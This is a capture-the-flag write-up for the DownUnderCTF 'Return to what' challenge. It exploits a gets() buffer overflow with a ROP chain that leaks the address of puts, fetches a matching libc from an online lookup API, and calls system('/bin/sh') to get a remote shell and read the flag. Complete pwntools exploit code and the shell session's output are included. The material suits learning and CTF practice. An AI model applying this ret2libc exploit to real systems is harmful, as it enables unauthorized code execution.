# DownUnderCTF

## Return to what

> 200
>
> Author: Faith
>
> This will show my friends!
>
> `nc chal.duc.tf 30003`
>
> Attached files:
>
>    * [return-to-what](return-to-what) (sha256: a679b33db34f15ce27ae89f63453c332ca7d7da66b24f6ae5126066976a5170b)

Tags: _pwn_ _x86-64_ _remote-shell_ _rop_ _bof_


## Summary

`gets`... again.  

This is the same as [_Shell this!_](https://github.com/datajerk/ctf-write-ups/tree/master/downunderctf2020/shellthis) sans the _win_ function.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No shellcode, but that's about it.


### Decompile with Ghidra


```c
void vuln(void)

{
  char local_38 [48];
  
  puts("Where would you like to return to?");
  gets(local_38);
  return;
}
```

`gets` vulnerability.  Easy ROP since no canary or PIE.  To get to the return address send `0x38` bytes (gotta love how Ghidra tells you that, i.e. `local_38`).


## Exploit

### Setup

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./return-to-what')
context.log_level = 'INFO'

if not args.REMOTE:
    context.log_file = 'local.log'
    libc = binary.libc
    p = process(binary.path)
else:
    context.log_file = 'remote.log'
    p = remote('chal.duc.tf', 30003)
```

Boilerplate pwntools.  `context.binary` is important for ROP.  Also notice there's no `libc` set for `REMOTE` since we have to find it first.


### Leak libc

```python
rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload  = 0x38 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.vuln)

p.sendlineafter('Where would you like to return to?\n',payload)

_ = p.recv(6)
puts = u64(_ + b'\0\0')
log.info('puts: ' + hex(puts))
```

Standard `puts` _putting_ itself out there.  With the `puts` location known we can find the version and base address of libc.  The last part of the payload jumps back to `vuln` for a second and final pass.


### Find libc

```python
if not 'libc' in locals():
    try:
        import requests
        r = requests.post('https://libc.rip/api/find', json = {'symbols':{'puts':hex(puts)[-3:]}})
        libc_url = r.json()[0]['download_url']
        libc_file = libc_url.split('/')[-1:][0]
        if not os.path.exists(libc_file):
            log.info('getting: ' + libc_url)
            r = requests.get(libc_url, allow_redirects=True)
            open(libc_file,'wb').write(r.content)
    except:
        log.critical('get libc yourself!')
        sys.exit(0)
    libc = ELF(libc_file)
    
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))
```

> Something new I'm experimenting with.

The `if` block will detect and download the correct libc. `libc_url = r.json()[0]['download_url']` needs to be changed if the downloaded libc does not work, just increment the `[0]` until you get the right one.


### Get a shell, get the flag

```python
payload  = 0x38 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)

p.sendlineafter('Where would you like to return to?\n',payload)
p.interactive()
```

Pop a shell, get the flag.

> `p64(pop_rdi + 1)` fixes a stack [alignment issue](https://blog.binpang.me/2019/07/12/stack-alignment/), see [blind-piloting](https://github.com/datajerk/ctf-write-ups/tree/master/b01lersctf2020/blind-piloting) for a lengthy example.

Output:

```
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/downunderctf2020/return_to_what/return-to-what'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to chal.duc.tf on port 30003: Done
[*] Loaded 14 cached gadgets for './return-to-what'
[*] puts: 0x7fa650a129c0
[*] '/pwd/datajerk/downunderctf2020/return_to_what/libc6_2.27-3ubuntu1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0x7fa650992000
[*] Switching to interactive mode
$ id
uid=1000 gid=999 groups=999
$ ls -l
total 24
-rw-r--r-- 1 65534 65534    38 Sep  4 04:31 flag.txt
-rwxr-xr-x 1 65534 65534 16664 Sep  4 04:31 return-to-what
$ cat flag.txt
DUCTF{ret_pUts_ret_main_ret_where???}
```